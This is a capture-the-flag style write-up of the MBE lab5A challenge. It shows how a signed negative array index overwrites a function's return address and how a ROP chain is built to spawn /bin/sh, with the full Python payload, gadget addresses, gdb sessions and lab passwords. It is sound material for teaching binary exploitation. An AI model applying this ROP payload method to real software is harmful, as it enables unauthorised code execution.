---
title: "Разбор Lab5A (сложно)"
permalink: /writeups/mbe/lab5a/
excerpt: "Разбор Lab5A."
---

---
First, log into the Lab05 as **lab5A** (`lab5A:th4ts_th3_r0p_i_lik3_2_s33`) and go to the challenges folder:

```shell
$ ssh lab5A@<VM_IP>
$ cd /levels/lab05/
```

Here, we don't really need to execute this program as we already saw it in [lab3A](/writeups/mbe/lab3a/)!

## Анализ исходного кода

Let's check the source code and see if there are any differences.

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include "utils.h"

#define STORAGE_SIZE 100

/* gcc --static -o lab5A lab5A.c */

/* get a number from the user and store it */
int store_number(unsigned int * data)
{
    unsigned int input = 0;
    int index = 0; // was unsigned integer

    /* get number to store */
    printf(" Number: ");
    input = get_unum();

    /* get index to store at */
    printf(" Index: ");
    index = (int)get_unum();

    /* make sure the slot is not reserved */
    // index > STORAGE_SIZE  has been added
    if(index % 3 == 0 || index > STORAGE_SIZE || (input >> 24) == 0xb7)
    {
        printf(" *** ERROR! ***\n");
        printf("   This index is reserved for doom!\n");
        printf(" *** ERROR! ***\n");

        return 1;
    }

    /* save the number to data storage */
    data[index] = input;

    return 0;
}

/* returns the contents of a specified storage index */
int read_number(unsigned int * data)
{
    int index = 0;

    /* get index to read from */
    printf(" Index: ");
    index = (int)get_unum();

    printf(" Number at data[%d] is %u\n", index, data[index]);

    return 0;
}

int main(int argc, char * argv[], char * envp[])
{
    int res = 0;
    char cmd[20] = {0};
    unsigned int data[STORAGE_SIZE] = {0};

    /* doom doesn't like environment variables */
    clear_argv(argv);
    clear_envp(envp);

    printf("----------------------------------------------------\n"\
           "  Welcome to doom's crappy number storage service!  \n"\
           "          Version 2.0 - With more security!         \n"\
           "----------------------------------------------------\n"\
           " Commands:                                          \n"\
           "    store - store a number into the data storage    \n"\
           "    read  - read a number from the data storage     \n"\
           "    quit  - exit the program                        \n"\
           "----------------------------------------------------\n"\
           "   doom has reserved some storage for himself :>    \n"\
           "----------------------------------------------------\n"\
           "\n");


    /* command handler loop */
    while(1)
    {
        /* setup for this loop iteration */
        printf("Input command: ");
        res = 1;

        /* read user input, trim newline */
        fgets(cmd, sizeof(cmd), stdin);
        cmd[strlen(cmd)-1] = '\0';

        /* select specified user command */
        if(!strncmp(cmd, "store", 5))
            res = store_number(data);
        else if(!strncmp(cmd, "read", 4))
            res = read_number(data);
        else if(!strncmp(cmd, "quit", 4))
            break;

        /* print the result of our command */
        if(res)
            printf(" Failed to do %s command\n", cmd);
        else
            printf(" Completed %s command successfully\n", cmd);

        memset(cmd, 0, sizeof(cmd));
    }

    return EXIT_SUCCESS;
}
```

The two (2) main differences with the **lab3a** are in *store_numer()*:
- The **index** variable is now an `integer` (was an `unsigned integer`)
- The **if** condition contains a new check: `index > STORAGE_SIZE`

In **lab3a** we could store data outside the `data[]` array with an *index* greater than **100**, which is not possible anymore. 

However, given the **index** variable is now *signed*, it introduced a new vulnerability. Indeed, we can now use a **negative** index! While we won't be able to overwrite the return address of *main()* this time, we can overwrite the return address of *store_number()*.

## Динамический анализ

First, we need to know the position of the return address of *store_number()*. To do this we can just put a breakpoint on the `ret` instruction at the end of *store_number()*.

```nasm
$ gdb -q ./lab5A
Reading symbols from ./lab5A...(no debugging symbols found)...done.
gdb-peda$ disas store_number
Dump of assembler code for function store_number:
   0x08048eae <+0>:  push   ebp
   0x08048eaf <+1>:  mov    ebp,esp
 
...[snip]...

   0x08048f5d <+175>:   mov    eax,0x0
   0x08048f62 <+180>:   leave
   0x08048f63 <+181>:   ret
End of assembler dump.
gdb-peda$ break *store_number+181
Breakpoint 1 at 0x8048f63
gdb-peda$ run
Starting program: /levels/lab05/lab5A

...[snip]...

Input command: store
 Number: 1
 Index: 1

...[snip]...

[------------------------------------stack-------------------------------------]
0000| 0xbffff4dc --> 0x804912e (<main+378>:  mov    DWORD PTR [esp+0x24],eax)
0004| 0xbffff4e0 --> 0xbffff508 --> 0x0
0008| 0xbffff4e4 --> 0x80bfa48 ("store")
0012| 0xbffff4e8 --> 0x5
0016| 0xbffff4ec --> 0x0
0020| 0xbffff4f0 --> 0x0
0024| 0xbffff4f4 --> 0x0
0028| 0xbffff4f8 --> 0xbffff7bc --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048f63 in store_number ()
gdb-peda$
```

Here, we can see that the return address (`0x804912e`) is located on the stack at `0xbffff4dc`. 

Now, to know at which offset we need to write to overwrite this value we need to know the starting address of the `data[]` array. As it is passed as an argument to *store_number()* in *main()*, we can place a breakpoint here and check the stack.

```nasm
gdb-peda$ disas main
Dump of assembler code for function main:
   0x08048fb4 <+0>:  push   ebp
   0x08048fb5 <+1>:  mov    ebp,esp

...[snip]...

   0x08049126 <+370>:   mov    DWORD PTR [esp],eax
   0x08049129 <+373>:   call   0x8048eae <store_number>
   0x0804912e <+378>:   mov    DWORD PTR [esp+0x24],eax

...[snip]...

   0x0804920a <+598>:   pop    ebp
   0x0804920b <+599>:   ret
End of assembler dump.
gdb-peda$ break *main+373
Breakpoint 1 at 0x8049129
gdb-peda$ run
Starting program: /levels/lab05/lab5A
----------------------------------------------------
  Welcome to doom's crappy number storage service!
          Version 2.0 - With more security!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   doom has reserved some storage for himself :>
----------------------------------------------------

Input command: store
[----------------------------------registers-----------------------------------]
EAX: 0xbffff508 --> 0x0
EBX: 0xbffff508 --> 0x0
ECX: 0x80bfa4c --> 0x65720065 ('e')
EDX: 0x72 ('r')
ESI: 0x0
EDI: 0xbffff698 ("store")
EBP: 0xbffff6c8 --> 0x8049990 (<__libc_csu_fini>:  push   ebx)
ESP: 0xbffff4e0 --> 0xbffff508 --> 0x0
EIP: 0x8049129 (<main+373>:   call   0x8048eae <store_number>)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8049120 <main+364>:   jne    0x8049134 <main+384>
   0x8049122 <main+366>:   lea    eax,[esp+0x28]
   0x8049126 <main+370>:   mov    DWORD PTR [esp],eax
=> 0x8049129 <main+373>:   call   0x8048eae <store_number>
   0x804912e <main+378>:   mov    DWORD PTR [esp+0x24],eax
   0x8049132 <main+382>:   jmp    0x80491a4 <main+496>
   0x8049134 <main+384>:   mov    DWORD PTR [esp+0x8],0x4
   0x804913c <main+392>:   mov    DWORD PTR [esp+0x4],0x80bfa4e
Guessed arguments:
arg[0]: 0xbffff508 --> 0x0
[------------------------------------stack-------------------------------------]
0000| 0xbffff4e0 --> 0xbffff508 --> 0x0
0004| 0xbffff4e4 --> 0x80bfa48 ("store")
0008| 0xbffff4e8 --> 0x5
0012| 0xbffff4ec --> 0x0
0016| 0xbffff4f0 --> 0x0
0020| 0xbffff4f4 --> 0x0
0024| 0xbffff4f8 --> 0xbffff7bc --> 0x0
0028| 0xbffff4fc --> 0xbffff758 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08049129 in main ()
```

As we can see, the `data[]` array is located at `0xbffff508`. Now, let's do a quick subtraction to find the offset:
- `0xbffff4dc - 0xbffff508 = -0x2c` or **-44** in decimal

Given we are playing with 4 bytes values, we need to divide **-44** by 4. The offset is **-11**. To check if it's working, let's store **1094795585** (or `0x41414141`) at offset -11.

```nasm
$ gdb -q ./lab5A
Reading symbols from ./lab5A...(no debugging symbols found)...done.
gdb-peda$ run
Starting program: /levels/lab05/lab5A
----------------------------------------------------
  Welcome to doom's crappy number storage service!
          Version 2.0 - With more security!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   doom has reserved some storage for himself :>
----------------------------------------------------

Input command: store
 Number: 1094795585
 Index: -11

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0xbffff508 --> 0x0
ECX: 0xfffffffe
EDX: 0xbffff4dc ("AAAA\b\365\377\277H\372\v\b\005")
ESI: 0x0
EDI: 0xbffff698 ("store")
EBP: 0xbffff6c8 --> 0x8049990 (<__libc_csu_fini>:  push   ebx)
ESP: 0xbffff4e0 --> 0xbffff508 --> 0x0
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10283 (CARRY parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xbffff4e0 --> 0xbffff508 --> 0x0
0004| 0xbffff4e4 --> 0x80bfa48 ("store")
0008| 0xbffff4e8 --> 0x5
0012| 0xbffff4ec --> 0x0
0016| 0xbffff4f0 --> 0x0
0020| 0xbffff4f4 --> 0x0
0024| 0xbffff4f8 --> 0xbffff7bc --> 0x0
0028| 0xbffff4fc --> 0xbffff758 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
```

Awesome. It was the easy part. Now, we need to build the ROP chain.

## ROP-цепочка

Like in the last challenge, we can try to execute `execve("/bin/sh")`to get a shell. The prototype for the shellcode will look like this:

```nasm
xor eax, eax
xor ecx, ecx
xor ebx, ebx
xor edx, edx
mov eax, 0x0b
mov ebx, <ptr to "/bin/sh">
int 0x80
```

However, this level have some restrictions, including the fact that we can only write chunks of 8 bytes followed by 4 bytes which we cannot write to due to the condition `index % 3 == 0`. So, we need to make sure that our ROP chain does not go into a reserved 4-byte chunk.

Also, we will avoid writing at negative index because it could mess up the execution flow. So, the first gadget should redirect the execution flow on `data[1]` and go from there. We already know that the `data[]` array is at `0xbffff508` and we had to remove 44 bytes to that value to overwrite the execution address, we need to find a gadget that will add 44 bytes to ESP and return.

```bash
lab5A@warzone:/levels/lab05$ ropgadget ./lab5A | grep "add esp, 0x2c ; ret"
0x08049bb7 : add esp, 0x2c ; ret
```

Nice! Let's see if we can use this gadget. First, we will store **1094795585** (or `0x41414141`) at offset 1 and **134519735** (`0x08049bb7`) at offset -11.

```nasm
$ gdb -q ./lab5A
Reading symbols from ./lab5A...(no debugging symbols found)...done.
gdb-peda$ run
Starting program: /levels/lab05/lab5A
----------------------------------------------------
  Welcome to doom's crappy number storage service!
          Version 2.0 - With more security!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   doom has reserved some storage for himself :>
----------------------------------------------------

Input command: store
 Number: 1094795585
 Index: 1
 Completed store command successfully
Input command: store
 Number: 134519735
 Index: -11

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0xbffff508 --> 0x0
ECX: 0xfffffffe
EDX: 0xbffff4dc --> 0x8049bb7 (<dcgettext+55>:  add    esp,0x2c)
ESI: 0x0
EDI: 0xbffff698 ("store")
EBP: 0xbffff6c8 --> 0x8049990 (<__libc_csu_fini>:  push   ebx)
ESP: 0xbffff510 --> 0x0
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xbffff510 --> 0x0
0004| 0xbffff514 --> 0x0
0008| 0xbffff518 --> 0x0
0012| 0xbffff51c --> 0x0
0016| 0xbffff520 --> 0x0
0020| 0xbffff524 --> 0x0
0024| 0xbffff528 --> 0x0
0028| 0xbffff52c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
```

Great. Now, like in the previous level, we don't have any reference to `/bin/sh`, but we can create our own by storing the string somewhere in the `data[]` array and get its position on the stack:

- Store **1852400175** at offset *40* (`0x6e69622f` or "/bin")
- Store **6845231** at offset *41* (`0x0068732f` or "/sh")

Here, I placed a breakpoint on the `ret` instruction of *store_number()* and checked the content of the `data[]` array (`0xbffff508`).

```nasm
...[snip]...

Breakpoint 1, 0x08048f63 in store_number ()
gdb-peda$ x/128x 0xbffff508
0xbffff508: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff518: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff528: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff538: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff548: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff558: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff568: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff578: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff588: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff598: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff5a8: 0x6e69622f  0x0068732f  0x00000000  0x00000000
0xbffff5b8: 0x00000000  0x00000000  0x00000000  0x00000000

...[snip]...

gdb-peda$ x/s 0xbffff5a8
0xbffff5a8: "/bin/sh"
```

Nice, our string pointer for "/bin/sh" is at `0xbffff5a8`. After playing with `ropgadget`, I found a few interesting gadgets to build our ROP chain.

```python
def store(val, idx):
   data = "store\n"
   data += str(int(val)) + "\n"
   data += str(idx) + "\n"

   return data


# Storing "/bin/sh"
payload = store(0x6e69622f, 40)
payload += store(0x0068732f, 41)

# Clear ECX
payload += store(0x0805befc, 1) # mov ecx, 0xffffffff ; cmovb eax, ecx ; ret
payload += store(0x08049df5, 2) # pop esi ; ret
payload += store(0x080dbbc4, 4) # inc ecx ; ret
payload += store(0x08049df5, 5) # pop esi ; ret

# Clear EDX
payload += store(0x08054cc5, 7) # mov edx, 0xffffffff ; ret
payload += store(0x08049df5, 8) # pop esi ; ret
payload += store(0x0805db17, 10) # inc edx ; ret
payload += store(0x08049df5, 11) # pop esi ; ret

# Set EAX to 0x0b
payload += store(0x08054c30, 13) # xor eax, eax ; ret
payload += store(0x08096be2, 14) # add eax, 0xb ; pop edi ; ret

# Set EBX to ptr "/bin/sh"
payload += store(0x08049df4, 16) # pop ebx ; pop esi ; ret
payload += store(0xbffff5a8, 17) # ptr to "/bin/sh"

payload += store(0x08048eaa, 19) # 0x08048eaa : int 0x80

# Overwrite store_number()
payload += store(0x08049bb7, -11) # add esp, 0x2c ; ret

print(payload)
```

If we try to run this code in *gdb*, we should be able to execute "/bin/sh".

```nasm
gdb-peda$ r < <(python /tmp/ropme.py)
Starting program: /levels/lab05/lab5A < <(python /tmp/ropme.py)
----------------------------------------------------
  Welcome to doom's crappy number storage service!
          Version 2.0 - With more security!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   doom has reserved some storage for himself :>
----------------------------------------------------

Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index: process 6927 is executing new program: /bin/dash
[Inferior 1 (process 6927) exited normally]
Warning: not running or target is remote
```

Nice!

## Решение

As usual, given the stack change a bit outside *gdb*, we will need to play with the value of the address pointing to "/bin/sh". After subtracting *0x40* to the address of "/bin/sh" we finally got a shell.

```bash
lab5A@warzone:/levels/lab05$ (python /tmp/ropme.py; cat -) | ./lab5A
----------------------------------------------------
  Welcome to doom's crappy number storage service!
          Version 2.0 - With more security!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   doom has reserved some storage for himself :>
----------------------------------------------------

Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:
whoami
lab5end
cat /home/lab5end/.pass
byp4ss1ng_d3p_1s_c00l_am1rite
```

Awesome! You can go to the next [challenge](/writeups/mbe/lab6c/) and explore **ASLR**.
